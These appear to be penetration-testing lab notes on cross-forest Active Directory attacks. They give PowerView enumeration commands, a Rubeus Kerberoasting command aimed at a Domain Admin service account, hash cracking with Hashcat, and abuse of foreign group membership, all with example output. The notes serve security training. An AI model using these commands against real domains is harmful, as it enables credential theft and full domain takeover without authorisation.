## **Overview**

In **cross-forest trust relationships**, Kerberos attacks such as **Kerberoasting** and **ASREPRoasting** can be performed across trusts, depending on their direction. This allows attackers to **gain a foothold** in a trusted domain and potentially escalate to Domain Admin privileges in the target forest.

---

## 1 Cross-Forest Kerberoasting

**Kerberoasting** can be used to extract **Kerberos Ticket Granting Service (TGS) hashes** for accounts with **Service Principal Names (SPNs)** in a trusted domain.

### **Enumerating Accounts with SPNs**

Using **PowerView**, we can enumerate accounts in the target domain that have **SPNs**.
```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```
Example Output:
```powershell
samaccountname
--------------
krbtgt
mssqlsvc
```
We identify **mssqlsvc**, which has an **SPN**. If this account has **Domain Admin** privileges, cracking its Kerberos hash will grant full control over the domain.

### **Checking Group Membership**

```powershell
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
```
Example Output:
```powershell
samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```
Since **mssqlsvc** is a **Domain Admin**, we proceed with **Kerberoasting**.

### **Performing the Kerberoasting Attack**

Using **Rubeus**, we extract the **Kerberos hash** for offline cracking.
```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```
We can now crack this hash using **Hashcat**. If successful, we gain **full admin access** to the target domain.

---
## 2 Admin Password Reuse & Cross-Domain Group Membership

### **Identifying Privileged Accounts Across Forests**

- If **admin accounts use the same password** across domains, compromising one grants access to another.
- **Domain Local Groups** allow **external security principals** from another forest.
- If a **Domain Admin** or **Enterprise Admin** from one domain is a member of a group in another domain, they can manage resources in both.

### **Checking for Foreign Group Membership**

Using **PowerView**, we enumerate **foreign group members**.
```powershell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```

Example Output:
```powershell
GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGISTICS,DC=LOCAL
```

To resolve the **SID** to a username:
```powershell
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
```

Example Output:
```powershell
INLANEFREIGHT\administrator
```

This means that the **Administrator account from INLANEFREIGHT.LOCAL is a member of the Administrators group in FREIGHTLOGISTICS.LOCAL**, granting **full administrative control** over the target domain.